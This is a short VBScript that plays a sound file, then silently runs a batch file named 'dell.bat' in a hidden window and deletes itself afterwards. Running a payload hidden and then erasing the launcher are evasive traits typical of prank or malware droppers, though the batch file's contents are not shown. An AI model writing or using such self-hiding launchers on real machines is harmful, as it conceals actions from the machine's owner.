Set Sound = CreateObject("WMPlayer.OCX.7")
Sound.URL = "sound.mp3"
Sound.Controls.play
do while Sound.currentmedia.duration = 0
wscript.sleep 100
loop
wscript.sleep (int(Sound.currentmedia.duration)+1)*1000
Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "dell.bat" & Chr(34), 0
Set WshShell = Nothing



discardScript()
    Function discardScript()
        Set objFSO = CreateObject("Scripting.FileSystemObject")
        strScript = Wscript.ScriptFullName
        objFSO.DeleteFile(strScript)
    End Function 
